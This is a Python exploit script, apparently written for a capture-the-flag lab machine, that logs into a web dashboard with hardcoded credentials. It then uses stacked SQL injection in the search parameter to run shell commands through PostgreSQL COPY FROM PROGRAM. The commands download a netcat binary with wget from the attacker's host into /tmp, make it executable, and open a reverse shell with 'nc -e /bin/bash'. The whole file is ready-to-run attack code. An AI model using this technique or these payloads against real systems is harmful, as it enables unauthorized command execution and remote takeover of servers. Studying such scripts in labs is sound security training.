#!/usr/bin/env python3

import requests
import random

# Change these values
clientip = "10.10.14.195"
clientport = 4444

# Not supposed to change these values
srvip = "10.10.10.46"
url = "dashboard.php?search=x"
target = "http://{}/{}".format(srvip, url)
username = "admin"
password = "qwerty789"
# table suffix (to give a chance to be unique)
suffix = random.randrange(1000, 9999)

# Login
s = requests.Session()
auth = {'username':username, 'password':password}
s.post("http://{}".format(srvip), data=auth)
print("[DEBUG] Authenticated")

# DROP TABLE
print("[DEBUG] drop table")
payload = "{}';DROP TABLE IF EXISTS cmd_{}; -- -".format(target, suffix)
r = s.get(payload)
print("[{}] {}".format(r.status_code, payload))

# CREATE TABLE
print("[DEBUG] create table")
payload = "{}';CREATE TABLE cmd_{}(cmd_output text); -- -".format(target, suffix)
r = s.get(payload)
print("[{}] {}".format(r.status_code, payload))

# NETCAT
print("[DEBUG] Download netcat and run it")
### nc is already installed on the server but we can't use it. Forced to download it in /tmp
payload = "{}';COPY cmd_{} FROM PROGRAM 'wget -P /tmp/{} http://{}/nc'; -- -".format(
  target, suffix, suffix, clientip)
r = s.get(payload)
print("[{}] {}".format(r.status_code, payload))

payload = "{}';COPY cmd_{} FROM PROGRAM 'chmod 777 /tmp/{}/nc'; -- -".format(
  target, suffix, suffix)
r = s.get(payload)
print("[{}] {}".format(r.status_code, payload))

payload = "{}';COPY cmd_{} FROM PROGRAM '/tmp/{}/nc -e /bin/bash {} {}'; -- -".format(
  target, suffix, suffix, clientip, clientport)
r = s.get(payload)
print("[{}] {}".format(r.status_code, payload))
